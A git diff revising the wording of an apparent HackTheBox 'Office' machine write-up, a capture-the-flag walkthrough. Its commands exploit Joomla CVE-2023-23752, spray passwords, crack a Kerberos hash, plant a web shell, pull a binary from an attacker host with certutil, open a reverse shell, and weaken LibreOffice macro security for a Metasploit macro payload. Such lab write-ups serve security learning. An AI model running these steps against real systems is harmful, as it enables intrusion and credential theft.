@@ -9,10 +9,10 @@ toc: true
 header:
     teaser: "/assets/images/headers/Office.png"
 ---
-Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, `PCAP` analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the `MacroSecurityLevel` registry value, abusing `MSKRP` to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges. 
+The "Office" machine on HackTheBox is a challenging Windows-based environment that incorporates a variety of vulnerabilities. These include exploiting a Joomla web application, analyzing PCAP files to extract Kerberos credentials, leveraging LibreOffice macros by manipulating registry settings, abusing MSKRP to dump DPAPI credentials, and exploiting Group Policies due to excessive privileges in Active Directory.
 
 # Reconnaissance
-We start off with an `nmap` scan of the host and find out we are dealing with a Windows Domain Controller.
+The initial phase begins with an `nmap` scan, revealing that the target is a Windows Domain Controller.
 
 ```console
 $ nmap -p- 10.10.11.3
@@ -41,18 +41,18 @@ PORT      STATE SERVICE
 55563/tcp open  unknown
 ```
 
-The domain befin used is `office.htb` and the domain controller is called `DC` so we can add those to our `/etc/hosts` file.
+The domain being used is `office.htb` and the Domain Controller is called `DC` so we can add those to our `/etc/hosts` file.
 
 ```console
 $ echo 10.10.11.3 office.htb dc.office.htb | sudo tee -a /etc/hosts
 ```
 
 ## Joomla Website
-Browsing to the website, we land on a `Joomla! CMS` page for "Tony Stark's Iron Man Company". We check the version by going to `http://10.10.11.3/administrator/manifests/files/joomla.xml` and find it to be running on version `4.2.7`.
+On accessing the website, we encounter a Joomla CMS for "Tony Stark's Iron Man Company". By checking the version, we identify it as `4.2.7`, which is vulnerable to a known exploit (`CVE-2023-23752`).
 
 ![Joomla Version](../assets/images/writeups/office/joomla-version.png)
 
-Looking for vulnerabilities for this specific version we find a PoC script for `CVE-2023-23752` on [GitHub](https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT). Running the script we find a password and a username.
+We find a PoC script for `CVE-2023-23752` on [GitHub](https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT). Running the exploit provides us with a username and password.
 
 ```console
 $ python CVE-2023-23752.py -u http://10.10.11.3
@@ -75,10 +75,10 @@ Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ
 [+] Gathering password(s) for: http://10.10.11.3
 [+] Password: H0lOgrams4reTakIng0Ver754!
 ```
-Trying to login as the `Administrator` account with this password fails. Looking at the endpoint where this password was found, it looks like this is the password for the Joomla database, so for now we proceed.
+Trying to login as the `Administrator` account on the Joomla backend fails. Looking at the endpoint where this password was found, it looks like this is the password for the Joomla database, so for now we proceed.
 
 ## Domain Enumeration
-Since port `88` is open, we continue by enumerating available usernames from the Domain Controller with `kerbrute`.
+With port `88` open, we proceed to enumerate domain usernames using `kerbrute`, successfully identifying several valid accounts.
 
 ```console
 $ kerbrute userenum -d office.htb --dc 10.10.11.3 jsmith.txt
@@ -100,11 +100,11 @@ Version: v1.0.3 (9dad6e1) - 07/16/24 - Ronnie Flathers @ropnop
 2024/07/16 09:53:54 >  [+] VALID USERNAME:	 hhogan@office.htb
 2024/07/16 09:54:00 >  [+] VALID USERNAME:	 ppotts@office.htb
 ```
-We found 6 usernames from the `jsmith` wordlist and will add them to our `ad_users.txt` list. 
+We found 6 usernames from the `jsmith` wordlist and add them to our `ad_users.txt` list. 
 
 # Foothold
 ## Access as Dwolfe
-We perform a password spraying attack using [NetExec](https://github.com/Pennyw0rth/NetExec) on the domain with the found password from the Joomla website.
+By performing a password spraying attack using [NetExec](https://github.com/Pennyw0rth/NetExec) we gain access to the domain with the `dwolfe` account. 
 
 ```console
 $ cat ad_users.txt
@@ -127,7 +127,7 @@ SMB         10.10.11.3      445    DC               [-] office.htb\hhogan:H0lOgr
 SMB         10.10.11.3      445    DC               [-] office.htb\ppotts:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
 ```
 
-Looks like we got a hit for the user `dwolfe`. We check what access this user has on the DC.
+We explore the accessible shares, discovering a PCAP file that holds valuable information.
 
 ```console
 $ smbmap -H 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!'
@@ -146,7 +146,7 @@ $ smbmap -H 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!'
 [*] Closed 1 connections
 ```
 
-The user `dwolfe` has access over the `SOC Analysis` share and we can connect to the share using `smbclient`.
+The user `dwolfe` has access over the `SOC Analysis` share and can connect to the share using `smbclient`.
 
 ```console
 $ smbclient.py 'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@10.10.11.3'
@@ -155,12 +155,11 @@ $ smbclient.py 'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@10.10.11.3'
 [*] Downloading Latest-System-Dump-8fbc124d.pcap
 ```
 
-Looks like the share contains a `PCAP` file, so lets inspect this further with `WireShark`. We start by showing the `Protocol Hierarchy` and notice there are some frames for the `Kerberos` protocol.
+The share contains a `PCAP` file, so lets inspect this further with WireShark. We start by showing the `Protocol Hierarchy` and notice there are several frames for the `Kerberos` protocol.
 
 ![PCAP Protocol Hierarchy](../assets/images/writeups/office/pcap-kerberos.png)
 
-Filtering the packets we notice an NTLM authentication session using SMB, which transmits an `AS-REQ`
-through KRB. In the second AS-REQ packet, we get a timestamp hash. We can use this information to crack the password of the user that tried to authenticate.
+Filtering the packets on the Kerberos protocol we notice an NTLM authentication session using SMB, which transmits an `AS-REQ`. In the second AS-REQ packet, we have a hashed timestamp. We can use this information to attempt to crack the password of the user that tried to authenticate.
 
 ![PCAP Kerberos As-Req](../assets/images/writeups/office/pcap-kerberos-req.png)
 
@@ -168,7 +167,7 @@ We can create a `Kerberos Pre-Auth` hash for the user `tstark`. To do this we fi
 
 ![Hashcat kerberos example](../assets/images/writeups/office/kerberos-preauth-format.png)
 
-We can now construct our hash and crack it.
+We can now reconstruct the hash and crack it.
 
 ```console
 $ hashcat -m 19900 tstark.hash $ROCKYOU
@@ -190,7 +189,7 @@ We found the credentials to be `tstark:playboy69`.
 
 # Lateral Movement
 ## Access as TStark
-We found that this user is also the administrator user for the Joomla backend so we can use the found password to login with the following credentials: `Administrator:playboy69`. Next we can go to `System > Site Templates` and select the available template. We can then add a webshell on one of the available pages (e.g. `error.php`) to get remote code execution.
+We found that `tstark` is also the administrator user for the Joomla backend so we can login with the following credentials: `Administrator:playboy69`. Next we can go to `System > Site Templates` and select the available template. We can then add a web shell on one of the available pages (e.g. `error.php`) to get remote code execution.
 
 ![Joomla RCE](../assets/images/writeups/office/joomla-rce.png)
 
@@ -204,6 +203,7 @@ Looks like we have command execution, so lets try to get a reverse shell. We can
 
 ```bash
 certutil -f -urlcache http%3A%2F%2F10.10.14.7%3A8888%2FRunasCs.exe RunasCs.exe
+
 .%5CRunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.7%3A4444
 ```
 
@@ -245,7 +245,7 @@ d-----          3/2/2022   7:58 PM                Windows Photo Viewer
 d-----          5/8/2021   1:34 AM                WindowsPowerShell
 d-----         4/14/2023   3:23 PM                Wireshark
 ```
-Older versions of `LibreOffice` usually have vulnerabilities that allows us to execute code if a user opens a malicious document. To find the exact version we can execute the following command.
+Older versions of `LibreOffice` usually have vulnerabilities that allow for code execution if a user opens a malicious document. To find the exact version we can execute the following command.
 
 ```console
 (remote) tstark@DC:C:\Users\tstark\Desktop$ wmic product get name
@@ -332,7 +332,7 @@ PSDrive      : HKLM
 PSProvider   : Microsoft.PowerShell.Core\Registry
 ```
 
-The value is set to 3, which means it's set to High security level. We need to find a way to change this value to allow our macros to trigger. The ACLs on this key show that the `Registry Editors` group has `FullControl` and lucky for us we are also part of this group.
+The value is set to `3`, which means it's set to High Security level. We need to find a way to change this value to allow our macros to trigger. The ACLs on this key show that the `Registry Editors` group has `FullControl` and lucky for us we are also part of this group.
 
 ```console
 (remote) tstark@DC:C:\$ $key = "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting"
@@ -369,7 +369,7 @@ So we are able to update the `MacroSecurityLevel` key.
 (remote) tstark@DC:C:\$ Set-ItemProperty -Path "$key\MacroSecurityLevel" -Name "Value" -Value 0
 ```
 
-We can now upload a document with a malicious macro created with MetaSploit and wait for it to get executed.
+We can now create a document with a malicious macro with MetaSploit.
 
 ```console
 msf6 > use exploit/multi/misc/openoffice_document_macro
